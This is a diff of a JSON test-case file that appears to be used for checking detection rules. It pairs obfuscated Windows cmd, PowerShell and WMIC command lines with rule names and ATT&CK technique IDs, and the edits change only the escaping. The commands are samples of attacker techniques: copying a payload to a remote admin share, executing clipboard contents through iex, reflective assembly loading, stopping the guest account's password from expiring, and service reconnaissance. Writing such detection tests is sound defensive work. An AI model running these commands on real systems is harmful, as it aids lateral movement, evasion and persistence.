@@ -9,7 +9,7 @@
   },
   {
     "test_id": "t1021.002_001",
-    "target_commandline": "cmd.exe /c \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /c \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1021.002",
     "shell": "cmd.exe",
@@ -17,7 +17,7 @@
   },
   {
     "test_id": "t1021.002_002",
-    "target_commandline": "cmd.exe /C \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /C \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1021.002",
     "shell": "cmd.exe",
@@ -81,7 +81,7 @@
   },
   {
     "test_id": "t1039_001",
-    "target_commandline": "cmd.exe /c \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /c \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1039",
     "shell": "cmd.exe",
@@ -89,7 +89,7 @@
   },
   {
     "test_id": "t1039_002",
-    "target_commandline": "cmd.exe /C \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /C \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1039",
     "shell": "cmd.exe",
@@ -153,7 +153,7 @@
   },
   {
     "test_id": "t1048_001",
-    "target_commandline": "cmd.exe /c \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /c \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1048",
     "shell": "cmd.exe",
@@ -161,7 +161,7 @@
   },
   {
     "test_id": "t1048_002",
-    "target_commandline": "cmd.exe /C \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
+    "target_commandline": "cmd.exe /C \\\"type C:\\\\temp\\\\payload.exe > \\\\\\\\10.0.0.2\\\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1048",
     "shell": "cmd.exe",
@@ -449,7 +449,7 @@
   },
   {
     "test_id": "t1012_003",
-    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -457,7 +457,7 @@
   },
   {
     "test_id": "t1012_004",
-    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -465,7 +465,7 @@
   },
   {
     "test_id": "t1012_005",
-    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -473,7 +473,7 @@
   },
   {
     "test_id": "t1012_006",
-    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -481,7 +481,7 @@
   },
   {
     "test_id": "t1012_007",
-    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -489,7 +489,7 @@
   },
   {
     "test_id": "t1012_008",
-    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -537,7 +537,7 @@
   },
   {
     "test_id": "t1027_003",
-    "target_commandline": "cmd /c \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \" iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /c \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \\\" iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -545,7 +545,7 @@
   },
   {
     "test_id": "t1027_004",
-    "target_commandline": "cmd /C \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \" iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /C \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \\\" iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -569,7 +569,7 @@
   },
   {
     "test_id": "t1027_007",
-    "target_commandline": "cmd /r \"echo Write-Host 'Bypass' | clip && powershell.exe -nop -c \" $c='cl'+'ipboard]::'; iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /r \"echo Write-Host 'Bypass' | clip && powershell.exe -nop -c \\\" $c='cl'+'ipboard]::'; iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -761,7 +761,7 @@
   },
   {
     "test_id": "t1027_031",
-    "target_commandline": "cmd.exe /c \"set PAYLOAD=Write-Host 'Benign Educational Bypass' & set LAUNCH=powershell.exe -NoP -c \"{1}{0}\" -f 'st','Te' & %LAUNCH%\"",
+    "target_commandline": "cmd.exe /c \"set PAYLOAD=Write-Host 'Benign Educational Bypass' & set LAUNCH=powershell.exe -NoP -c \\\"{1}{0}\\\" -f 'st','Te' & %LAUNCH%\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_via_var",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -937,7 +937,7 @@
   },
   {
     "test_id": "t1027_053",
-    "target_commandline": "powershell.exe -Command \"[Reflection.Assembly]::(\"{1}{0}\" -f 'oad','L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -Command \"[Reflection.Assembly]::(\\\"{1}{0}\\\" -f 'oad','L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -945,7 +945,7 @@
   },
   {
     "test_id": "t1027_054",
-    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -953,7 +953,7 @@
   },
   {
     "test_id": "t1027_055",
-    "target_commandline": "powershell.exe -coMMANd \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -coMMANd \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -961,7 +961,7 @@
   },
   {
     "test_id": "t1027_056",
-    "target_commandline": "powershell.exe /\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe /\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -969,7 +969,7 @@
   },
   {
     "test_id": "t1027_057",
-    "target_commandline": "powershell.exe -coMMaNd \"[Reflection.Assembly]::(\" {1}{0}\" -f 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -coMMaNd \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -f 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -977,7 +977,7 @@
   },
   {
     "test_id": "t1027_058",
-    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -\"f\" 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -\"f\" 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -985,7 +985,7 @@
   },
   {
     "test_id": "t1027_059",
-    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -993,7 +993,7 @@
   },
   {
     "test_id": "t1027_060",
-    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\" {1}{0}\" -f 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -f 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1027",
     "shell": "cmd.exe",
@@ -2041,7 +2041,7 @@
   },
   {
     "test_id": "t1046_041",
-    "target_commandline": "powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount -Filter \"Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount -Filter \\\"Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2049,7 +2049,7 @@
   },
   {
     "test_id": "t1046_042",
-    "target_commandline": "powershell.exe -coMmAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMmAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2057,7 +2057,7 @@
   },
   {
     "test_id": "t1046_043",
-    "target_commandline": "powershell.exe -coMmAND \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMmAND \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2065,7 +2065,7 @@
   },
   {
     "test_id": "t1046_044",
-    "target_commandline": "powershell.exe -cOMMand \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -cOMMand \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2073,7 +2073,7 @@
   },
   {
     "test_id": "t1046_045",
-    "target_commandline": "powershell.exe -coMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2081,7 +2081,7 @@
   },
   {
     "test_id": "t1046_046",
-    "target_commandline": "powershell.exe -COMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -COMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2089,7 +2089,7 @@
   },
   {
     "test_id": "t1046_047",
-    "target_commandline": "powershell.exe -\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2097,7 +2097,7 @@
   },
   {
     "test_id": "t1046_048",
-    "target_commandline": "powershell.exe /\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2105,7 +2105,7 @@
   },
   {
     "test_id": "t1046_049",
-    "target_commandline": "powershell.exe -c \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -c \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2113,7 +2113,7 @@
   },
   {
     "test_id": "t1046_050",
-    "target_commandline": "powershell.exe -cOMMANd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -cOMMANd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2121,7 +2121,7 @@
   },
   {
     "test_id": "t1046_051",
-    "target_commandline": "powershell.exe -comMand \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -comMand \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2361,7 +2361,7 @@
   },
   {
     "test_id": "t1046_081",
-    "target_commandline": "powershell -NoProfile -Command \"Get-WmiObject -Class Win32_Service -Filter \"Name='spooler'\"\"",
+    "target_commandline": "powershell -NoProfile -Command \"Get-WmiObject -Class Win32_Service -Filter \\\"Name='spooler'\\\"\"",
     "target_rule": "proc_creation_win_wmic_recon_service",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2369,7 +2369,7 @@
   },
   {
     "test_id": "t1046_082",
-    "target_commandline": "powershell -nop -c \"Get-WmiObject -Class Win32_Service -Filter \" Name='spooler'\"\"",
+    "target_commandline": "powershell -nop -c \"Get-WmiObject -Class Win32_Service -Filter \\\" Name='spooler'\\\"\"",
     "target_rule": "proc_creation_win_wmic_recon_service",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2377,7 +2377,7 @@
   },
   {
     "test_id": "t1046_083",
-    "target_commandline": "powershell -NoPROfIle -c \"Get-WmiObject -Class Win32_Service -Filter \" Name='spooler'\"\"",
+    "target_commandline": "powershell -NoPROfIle -c \"Get-WmiObject -Class Win32_Service -Filter \\\" Name='spooler'\\\"\"",
     "target_rule": "proc_creation_win_wmic_recon_service",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2385,7 +2385,7 @@
   },
   {
     "test_id": "t1046_084",
-    "target_commandline": "powershell -NOprOFiLE /\"Command\" \"Get-WmiObject -Class Win32_Service -Filter \" Name='spooler'\"\"",
+    "target_commandline": "powershell -NOprOFiLE /\"Command\" \"Get-WmiObject -Class Win32_Service -Filter \\\" Name='spooler'\\\"\"",
     "target_rule": "proc_creation_win_wmic_recon_service",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2393,7 +2393,7 @@
   },
   {
     "test_id": "t1046_085",
-    "target_commandline": "powershell /\"NoProfile\" -\"Command\" \"Get-WmiObject -Class Win32_Service -Filter \" Name='spooler'\"\"",
+    "target_commandline": "powershell /\"NoProfile\" -\"Command\" \"Get-WmiObject -Class Win32_Service -Filter \\\" Name='spooler'\\\"\"",
     "target_rule": "proc_creation_win_wmic_recon_service",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2401,7 +2401,7 @@
   },
   {
     "test_id": "t1046_086",
-    "target_commandline": "powershell -nop -\"Command\" \"Get-WmiObject -Class Win32_Service -Filter \" Name='spooler'\"\"",
+    "target_commandline": "powershell -nop -\"Command\" \"Get-WmiObject -Class Win32_Service -Filter \\\" Name='spooler'\\\"\"",
     "target_rule": "proc_creation_win_wmic_recon_service",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2409,7 +2409,7 @@
   },
   {
     "test_id": "t1046_087",
-    "target_commandline": "powershell -\"NoProfile\" /\"Command\" \"Get-WmiObject -Class Win32_Service -Filter \" Name='spooler'\"\"",
+    "target_commandline": "powershell -\"NoProfile\" /\"Command\" \"Get-WmiObject -Class Win32_Service -Filter \\\" Name='spooler'\\\"\"",
     "target_rule": "proc_creation_win_wmic_recon_service",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2417,7 +2417,7 @@
   },
   {
     "test_id": "t1046_088",
-    "target_commandline": "powershell -nop -cOMMaNd \"Get-WmiObject -Class Win32_Service -Filter \" Name='spooler'\"\"",
+    "target_commandline": "powershell -nop -cOMMaNd \"Get-WmiObject -Class Win32_Service -Filter \\\" Name='spooler'\\\"\"",
     "target_rule": "proc_creation_win_wmic_recon_service",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2425,7 +2425,7 @@
   },
   {
     "test_id": "t1046_089",
-    "target_commandline": "wmic.exe /node:\"localhost\" /namespace:\\root\\cimv2 path Win32_Service get Name,DisplayName,PathName,StartMode /format:csv",
+    "target_commandline": "wmic.exe /node:\"localhost\" /namespace:\\\\root\\\\cimv2 path Win32_Service get Name,DisplayName,PathName,StartMode /format:csv",
     "target_rule": "proc_creation_win_wmic_recon_unquoted_service_search",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2433,7 +2433,7 @@
   },
   {
     "test_id": "t1046_090",
-    "target_commandline": "wmic.exe /node:\"localhost\" /namespace:\\root\\cimv2 path Win32_Service get Name,DisplayName,PathName,StartMode -\"format:csv\"",
+    "target_commandline": "wmic.exe /node:\"localhost\" /namespace:\\\\root\\\\cimv2 path Win32_Service get Name,DisplayName,PathName,StartMode -\"format:csv\"",
     "target_rule": "proc_creation_win_wmic_recon_unquoted_service_search",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2441,7 +2441,7 @@
   },
   {
     "test_id": "t1046_091",
-    "target_commandline": "wmic.exe /nODE:\"LOcALHOST\" /nAmesPACe:\\ROoT\\cimV2 path Win32_Service get Name,DisplayName,PathName,StartMode -\"format:csv\"",
+    "target_commandline": "wmic.exe /nODE:\"LOcALHOST\" /nAmesPACe:\\\\ROoT\\\\cimV2 path Win32_Service get Name,DisplayName,PathName,StartMode -\"format:csv\"",
     "target_rule": "proc_creation_win_wmic_recon_unquoted_service_search",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2449,7 +2449,7 @@
   },
   {
     "test_id": "t1046_092",
-    "target_commandline": "wmic.exe /NoDe:\"locaLhOst\" /namEspAcE:\\Root\\ciMV2 path Win32_Service get Name,DisplayName,PathName,StartMode -\"format:csv\"",
+    "target_commandline": "wmic.exe /NoDe:\"locaLhOst\" /namEspAcE:\\\\Root\\\\ciMV2 path Win32_Service get Name,DisplayName,PathName,StartMode -\"format:csv\"",
     "target_rule": "proc_creation_win_wmic_recon_unquoted_service_search",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2457,7 +2457,7 @@
   },
   {
     "test_id": "t1046_093",
-    "target_commandline": "wmic.exe /node:\"localhost\" -\"namespace:\\root\\cimv2\" path Win32_Service get Name,DisplayName,PathName,StartMode /\"format:csv\"",
+    "target_commandline": "wmic.exe /node:\"localhost\" -\"namespace:\\\\root\\\\cimv2\" path Win32_Service get Name,DisplayName,PathName,StartMode /\"format:csv\"",
     "target_rule": "proc_creation_win_wmic_recon_unquoted_service_search",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2465,7 +2465,7 @@
   },
   {
     "test_id": "t1046_094",
-    "target_commandline": "wmic.exe /node:\"localhost\" -\"namespace:\\root\\cimv2\" path Win32_Service get Name,DisplayName,PathName,StartMode /FormAT:CSv",
+    "target_commandline": "wmic.exe /node:\"localhost\" -\"namespace:\\\\root\\\\cimv2\" path Win32_Service get Name,DisplayName,PathName,StartMode /FormAT:CSv",
     "target_rule": "proc_creation_win_wmic_recon_unquoted_service_search",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2473,7 +2473,7 @@
   },
   {
     "test_id": "t1046_095",
-    "target_commandline": "wmic.exe /\"node:\"localhost\"\" /namespace:\\root\\cimv2 path Win32_Service get Name,DisplayName,PathName,StartMode -\"format:csv\"",
+    "target_commandline": "wmic.exe /\"node:\"localhost\"\" /namespace:\\\\root\\\\cimv2 path Win32_Service get Name,DisplayName,PathName,StartMode -\"format:csv\"",
     "target_rule": "proc_creation_win_wmic_recon_unquoted_service_search",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2481,7 +2481,7 @@
   },
   {
     "test_id": "t1046_096",
-    "target_commandline": "wmic.exe /nODe:\"lOcalhosT\" /nAMESpAcE:\\ROOt\\Cimv2 path Win32_Service get Name,DisplayName,PathName,StartMode /\"format:csv\"",
+    "target_commandline": "wmic.exe /nODe:\"lOcalhosT\" /nAMESpAcE:\\\\ROOt\\\\Cimv2 path Win32_Service get Name,DisplayName,PathName,StartMode /\"format:csv\"",
     "target_rule": "proc_creation_win_wmic_recon_unquoted_service_search",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2489,7 +2489,7 @@
   },
   {
     "test_id": "t1046_097",
-    "target_commandline": "wmic.exe /NOde:\"LoCALhoST\" /nAMesPace:\\rOot\\CImv2 path Win32_Service get Name,DisplayName,PathName,StartMode /fOrMAt:Csv",
+    "target_commandline": "wmic.exe /NOde:\"LoCALhoST\" /nAMesPace:\\\\rOot\\\\CImv2 path Win32_Service get Name,DisplayName,PathName,StartMode /fOrMAt:Csv",
     "target_rule": "proc_creation_win_wmic_recon_unquoted_service_search",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2649,7 +2649,7 @@
   },
   {
     "test_id": "t1046_117",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2657,7 +2657,7 @@
   },
   {
     "test_id": "t1046_118",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2665,7 +2665,7 @@
   },
   {
     "test_id": "t1046_119",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2673,7 +2673,7 @@
   },
   {
     "test_id": "t1046_120",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2681,7 +2681,7 @@
   },
   {
     "test_id": "t1046_121",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2705,7 +2705,7 @@
   },
   {
     "test_id": "t1046_124",
-    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2713,7 +2713,7 @@
   },
   {
     "test_id": "t1046_125",
-    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2721,7 +2721,7 @@
   },
   {
     "test_id": "t1046_126",
